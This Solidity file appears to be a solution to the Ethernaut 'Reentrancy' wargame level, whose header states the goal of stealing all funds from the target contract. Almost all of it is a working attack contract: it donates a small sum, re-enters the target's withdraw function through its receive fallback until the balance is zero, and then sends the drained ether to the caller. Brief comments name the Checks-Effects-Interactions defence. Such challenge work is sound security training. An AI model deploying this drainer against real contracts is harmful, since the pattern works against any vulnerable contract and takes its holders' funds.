// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 10. REENTRANCY
 * @dev Steal all the funds from the contract.
 */

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

// Always follow the Checks-Effects-Interactions pattern
// Never change any states after an external call
contract Reentered {
    address private immutable target;
    uint256 donation = 0.001 ether;

    constructor(address _target) {
        target = _target;
    }

    // the fallback will take care of the reentrancy attack
    receive() external payable {
        if (target.balance >= donation) {
            IReentrance(target).withdraw(donation);
        }
    }

    function attack() public payable {
        // 1. Donate so you have some funds to withdraw
        IReentrance(target).donate{value: donation}(address(this));
        // 2. Call the withdraw function
        IReentrance(target).withdraw(donation);
        // 3. The contract has been drained successfully
        require(address(target).balance == 0, "Reentrancy failed!");
        // 4. Withdraw the funds from the attacker contract
        withdraw();
    }

    function withdraw() public {
        uint256 bal = address(this).balance;
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "Transfer Failed");
    }
}
